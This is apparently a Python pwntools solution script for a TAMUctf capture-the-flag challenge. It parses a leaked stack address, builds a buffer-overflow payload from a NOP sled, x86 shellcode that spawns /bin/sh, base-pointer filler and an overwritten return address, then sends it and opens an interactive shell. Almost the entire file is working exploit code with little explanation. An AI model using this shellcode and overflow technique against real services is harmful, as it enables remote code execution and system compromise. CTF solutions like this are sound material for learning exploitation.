from pwn import *
import re

# Challenge provides us with a message:

# E.g
# >>> Take this, you might need it on your journey 0xffbd919e!

# This lets us grab the top of the stack. This is where we want the return address to point to.
# If we overflow the buffer it lets us run our shellcode and spawn a shell

def gen_shellcode(ret_address):
   
    ## Hello world
    # shellcode = r""
    # shellcode += r"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"
    # shellcode += r"\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"

    ## Shellcode to spawn a shell
    shellcode = ""
    shellcode += r"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
    shellcode += r"\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
    shellcode += r"\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

    BUFFER_LEN = 298    
    NOP = b"\x90"

    shellcode_bytes = shellcode.split("\\")
    shellcode_length = len(shellcode_bytes) - 1

    shellcode = shellcode.replace("\\x", "")
    
    shellcode_bytes = bytes.fromhex(shellcode)

    output = b""
    for i in range(BUFFER_LEN - shellcode_length):
        output += NOP

    output += shellcode_bytes
    output += b"\x41\x41\x41\x41" # Overwrite the base pointer
    output += ret_address
    
    return output

r = remote("pwn.tamuctf.com", 4323)

line = r.readline().decode("utf-8")
print(line)

parts = line.split(" ")

# Preps the address provided in the message
address = parts[-1]
address = address[2:]
address = address[:-2]
address_bytes = re.findall(r"..", address)
address_bytes = list(map(bytes.fromhex, address_bytes))

return_adress = b"".join(address_bytes[::-1])

payload = gen_shellcode(return_adress)

r.sendline(payload)

# Gets our flag
r.interactive()
r.close()
